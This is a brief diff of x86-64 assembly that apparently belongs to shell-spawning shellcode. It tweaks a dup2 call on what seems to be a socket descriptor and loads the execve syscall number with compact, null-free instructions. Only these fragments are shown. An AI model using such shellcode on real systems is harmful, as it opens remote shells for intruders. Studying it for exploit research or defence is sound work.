@@ -123,7 +123,7 @@ _start:
 	push byte 33
 	pop rax
         mov rdi, r9             ; oldfd
-        xor rsi, rsi		; fd
+        xor esi, esi		; fd
         syscall
 
 
@@ -232,5 +232,6 @@ _shell:
         mov rsi, rsp
 
         ; Call the Execve syscall
-        add rax, 59
+	push byte 59
+	pop rax 
         syscall
